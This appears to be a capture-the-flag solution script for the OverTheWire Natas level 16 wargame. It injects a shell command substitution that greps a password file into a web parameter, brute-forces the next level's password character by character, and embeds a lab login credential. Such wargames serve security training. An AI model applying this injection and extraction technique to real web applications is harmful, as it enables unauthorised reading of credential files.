#! env python3

import requests

site = "http://natas16.natas.labs.overthewire.org/?needle=$(grep {} /etc/natas_webpass/natas17)"
user = "natas16"
pswd = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
exist = "African"

# Chars that the passwd contains
contains = []

# Find characters in the password
for c in chars:
    temp = site.format(c)
    r = requests.get(temp, auth=(user, pswd))
    if exist not in r.text:
        contains.append(c)
        print("Contained chars: {}".format(contains))
print("All contained chars: {}".format(contains))

# Build password up to 64 characters long
# We get to know each char position is correct

password = ""
for i in range(0, 64):
    if len(password) != i:  # If our iteration desyncs with the length of our password
        break               # then i should be larger than length so no more chars can 
                            # be appended to password     
    for c in contains:
        temp = "^" + password + c;  
        temp = site.format(temp)
        r = requests.get(temp, auth=(user, pswd))
        if exist not in r.text:
            password += c
            print("Password: {}".format(password))
            break
     
print("Password: {}".format(password))

